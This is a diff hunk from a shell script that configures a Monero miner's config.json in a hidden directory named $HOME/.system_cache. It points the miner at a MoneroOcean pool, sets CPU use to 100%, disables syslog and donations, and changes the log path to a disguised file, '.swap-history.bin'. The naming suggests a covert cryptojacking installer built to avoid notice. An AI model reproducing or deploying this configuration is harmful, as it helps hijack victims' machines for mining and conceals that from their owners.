@@ -620,7 +620,7 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.syst
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.system_cache/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.system_cache/config.json
-sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.system_cache/config.json
+sed -i 's#"log-file": *null,#"log-file": "$HOME/.system_cache/.swap-history.bin",#' $HOME/.system_cache/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_cache/config.json
